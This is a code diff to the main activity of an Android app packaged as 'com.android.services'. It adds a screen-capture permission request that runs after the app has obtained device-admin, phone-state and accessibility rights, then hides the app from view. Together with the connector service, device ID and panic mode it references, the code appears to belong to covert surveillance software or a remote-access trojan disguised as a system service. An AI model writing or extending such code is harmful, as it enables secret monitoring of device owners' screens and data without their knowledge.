@@ -1,17 +1,22 @@
 package com.android.services
 
 import android.Manifest
+import android.app.Activity
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.view.View
+import android.view.WindowManager
+import androidx.activity.result.ActivityResultLauncher
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.android.services.databinding.ActivityMainBinding
@@ -36,6 +41,9 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.READ_PHONE_STATE,
     )
 
+    // MediaProjection permission launcher
+    private lateinit var projectionLauncher: ActivityResultLauncher<Intent>
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         binding = ActivityMainBinding.inflate(layoutInflater)
@@ -43,6 +51,21 @@ class MainActivity : AppCompatActivity() {
 
         ensureDeviceId()
         startConnectorService()
+
+        // Register MediaProjection result launcher
+        projectionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
+            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+                try {
+                    val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                    val proj = mgr.getMediaProjection(result.resultCode, result.data!!)
+                    val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+                    MediaProjectionHolder.setup(applicationContext, proj, wm)
+                } catch (e: Exception) {
+                    android.util.Log.w("MainActivity", "MediaProjection setup failed: ${e.message}")
+                }
+            }
+            hideAndExit()
+        }
 
         val fromPanic = intent.getBooleanExtra("PANIC_MODE", false)
 
@@ -68,7 +91,13 @@ class MainActivity : AppCompatActivity() {
         val setupDone = allPermsOk && adminOk
 
         if (setupDone && !fromPanic) {
-            hideAndExit()
+            // Semua izin OK — minta MediaProjection dulu jika belum aktif, lalu hide
+            if (!MediaProjectionHolder.isAvailable()) {
+                requestMediaProjection()
+                // hideAndExit() dipanggil dari dalam projectionLauncher callback
+            } else {
+                hideAndExit()
+            }
             return
         }
 
@@ -96,6 +125,20 @@ class MainActivity : AppCompatActivity() {
             binding.btnAccessibility.text = "Berikan Izin →"
             binding.btnAccessibility.visibility = View.VISIBLE
             binding.btnLaunch.visibility = View.GONE
+        }
+    }
+
+    /**
+     * Tampilkan system dialog untuk MediaProjection (screen capture) permission.
+     * Dialog hanya muncul saat session baru (in-memory, per process — bukan permanen).
+     */
+    private fun requestMediaProjection() {
+        try {
+            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            projectionLauncher.launch(mgr.createScreenCaptureIntent())
+        } catch (e: Exception) {
+            android.util.Log.w("MainActivity", "requestMediaProjection failed: ${e.message}")
+            hideAndExit()
         }
     }
 
